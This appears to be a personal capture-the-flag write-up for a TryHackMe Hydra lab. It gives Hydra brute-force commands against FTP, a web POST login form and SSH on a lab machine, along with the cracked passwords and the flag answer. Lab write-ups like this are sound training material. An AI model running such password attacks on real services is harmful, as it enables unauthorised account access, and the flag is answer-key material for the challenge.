---
{"dg-publish":true,"permalink":"/my-digital-garden/","tags":["gardenEntry"],"created":"2025-02-06T18:51:33.711-05:00","updated":"2025-02-06T21:34:19.771-05:00"}
---

Testing 123

Trying this out again 


![](/img/user/TryHackMe/THM_Images/c0b5125ed3719685b8ea6c74db9914ad.png)

![](/img/user/TryHackMe/THM_Images/687bf32905e7a615172b917db8f82d0b.png)

# Task 2 - Using Hydra

- Example command to brute force ftp    
    - `hydra -l user -P passlist.txt [ftp://MACHINE_IP](ftp://MACHINE_IP)`
- Another example
    - `hydra -l <username> -P <wordlist> 10.10.71.57 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`


| Option              | Description                                                                            |
| ------------------- | -------------------------------------------------------------------------------------- |
| -l                  | specifies the (SSH) username for login                                                 |
| -P                  | indicates a list of passwords                                                          |
| -t                  | sets the number of threads to spawn                                                    |
| http-post-form      | the type of the form is POST                                                           |
| path              | the login page URL, for example, login.php                                             |
| login_credentials | the username and password used to log in, for example, username=^USER^&password=^PASS^ |
| invalid_response  | part of the response when the login fails                                              |
| -V                  | verbose output for every attempt                                                       |



> [!Question]
> **Use Hydra to bruteforce molly's web password. What is flag 1?**

Going to the target IP address gives us a web login from with a username and password,

Checking the page source tells us that its using a "POST" method as the request type

Ran the command

```
hydra -l molly -P rockyou.txt 10.10.71.57 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect"
```

Using the username, molly, and the password, sunshine, allows us to make it through and login to find the flag.


Used the following command to find the SSH password: 

```
hydra -l molly -P rockyou.txt 10.10.71.57 -t 4 ssh
```


Then SSH'd into molly's machine to get the flag using the password, butterfly.


> [!Success] Answer
> `THM {c8eeb0468febbadea859baeb33b2541b}`
